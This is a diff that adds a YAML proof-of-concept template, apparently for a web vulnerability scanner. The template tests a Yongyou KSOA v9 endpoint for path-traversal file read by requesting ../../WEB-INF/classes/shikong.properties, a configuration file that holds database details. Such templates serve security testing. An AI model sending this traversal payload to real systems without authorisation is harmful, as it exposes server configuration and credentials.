@@ -1,0 +1,16 @@
+name: poc-yaml-yongyou-ksoav9-downnewsatt-readfile
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /newspublish/downnewsatt.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: exclusivenm=../../WEB-INF/classes/shikong.properties
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("skmaster") && response.body_string.contains("dbserver")
+expression: r0()
+detail: {}
